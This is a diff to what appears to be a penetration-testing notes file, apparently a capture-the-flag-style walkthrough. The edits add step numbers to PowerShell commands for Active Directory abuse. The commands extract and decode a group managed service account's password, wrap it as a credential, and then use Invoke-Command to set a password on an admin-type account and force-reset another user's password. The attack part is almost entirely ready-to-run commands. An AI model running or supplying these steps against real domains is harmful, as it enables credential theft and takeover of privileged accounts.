@@ -27,17 +27,17 @@ Using netexec:
 
 Decrypt the gmsa password
 
-    $gmsa = Get-ADServiceAccount -Identity bir-adfs-gmsa -Properties msDS-ManagedPassword
-    $mp = $gmsa.'msDS-ManagedPassword'
+    1. $gmsa = Get-ADServiceAccount -Identity bir-adfs-gmsa -Properties msDS-ManagedPassword
+    2. $mp = $gmsa.'msDS-ManagedPassword'
     $mp // Get the password in numbers
-    ConvertFrom-ADManagedPasswordBlob $mp
+    3. ConvertFrom-ADManagedPasswordBlob $mp
 
 If the clear-text password not appear, let's just use it.
 
-    $password = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
-    $cred = New-Object System.Management.Automation.PSCredential "GroupName" , $password
+    1. $password = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
+    2. $cred = New-Object System.Management.Automation.PSCredential "GroupName" , $password
 
 Now we got the credentials Objects, let's open a new session with the privileged user:
 
-    Invoke-Command -ComputerName 127.0.0.1 -cred $cred -ScriptBlock {net user DomainAdminmUser P@ssw0rd1!}
-    Invoke-Command -ComputerName 127.0.0.1 -Credential $cred -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!' -Force)}
+    1. Invoke-Command -ComputerName 127.0.0.1 -cred $cred -ScriptBlock {net user DomainAdminmUser P@ssw0rd1!}
+    2. Invoke-Command -ComputerName 127.0.0.1 -Credential $cred -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!' -Force)}
